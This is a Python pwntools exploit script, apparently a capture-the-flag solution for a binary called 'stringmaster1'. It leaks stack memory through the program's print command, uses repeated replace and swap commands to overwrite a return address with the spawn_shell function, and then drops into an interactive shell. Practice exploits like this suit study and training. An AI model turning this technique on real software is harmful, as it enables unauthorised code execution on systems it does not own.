from pwn import *

p=process('./stringmaster1')
e=ELF('./stringmaster1')
pause()
log.info('[SHELL ADDRESS]: '+hex(e.sym['_Z11spawn_shellv']))
log.info('[ADDRESS DESTINATION]: '+hex(0x40246d))

def replace(p,a,b):
    p.sendlineafter('\n> ','replace\n')
    p.sendline("{} {}".format(a,b))
    log.info("[REPLACING]")

def swap(p,a,b):
    p.sendlineafter('\n> ','swap\n')
    p.sendline("{} {}".format(a,b))
    log.info("[SWAPING]")


def print_info(p):
    p.recvuntil('\n> ')
    p.sendline('print\n')
    log.info("[DATA LEAKING]")
    return p.recvuntil("\nEnter the command you want to execute:", drop = True)

def quit(p):
    p.sendlineafter('\n> ','quit\n')
    log.info('[QUITING]')

def trans1(p):
    s = [ b'\xa7', b'\x11', b'\x40']
    for i in range(3):
        replace(p,str1[i],s[i])
def trans2(p):
    for i in range(3):
        swap(p,i,i+0x88)


p.recvuntil("String1: ")
str1 = p.recvline()
p.recvuntil("String2: ")
str2 = p.recvline()

log.info("String 1: {}".format(str1))
log.info("String 2: {}".format(str2))
replace(p,'X','x')


log.info("[LEAKED DATA]")
print "[BEFORE]"
print hexdump(print_info(p))
trans1(p)
trans2(p)
print hexdump(print_info(p))
p.interactive()

